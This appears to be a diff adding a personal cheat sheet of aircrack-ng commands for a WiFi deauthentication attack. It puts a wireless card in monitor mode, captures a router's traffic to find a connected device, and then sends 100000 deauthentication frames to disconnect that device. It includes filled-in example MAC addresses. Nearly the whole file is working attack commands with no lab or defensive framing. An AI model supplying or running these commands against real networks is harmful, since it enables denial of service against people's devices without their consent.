@@ -1,0 +1,19 @@
+//monitor mode//
+ifconfig wlan0 down
+airmon-ng check kill
+airmon-ng start wlan0
+iwconfig
+
+
+airodump-ng wlan0
+
+airodump-ng --bssid <router mac address> --channel 2 --write <filename> wlan0   //find connected device to the router
+eg : airodump-ng --bssid FC:CD:2F:AA:D1:10 --channel 2 --write testwifi wlan0
+
+press ctrl+c to quit
+
+wireshark  //to get transmitter mac adress or target device mac address
+put .cap file and get the target mac address
+
+aireplay-ng --deauth 100000 -a <router mac address> -c <target device mac address> wlan0  //disconnect command
+eg :aireplay-ng --deauth 100000 -a FC:CD:2F:AA:D1:10 -c 9E:D5:14:D4:92:35 wlan0
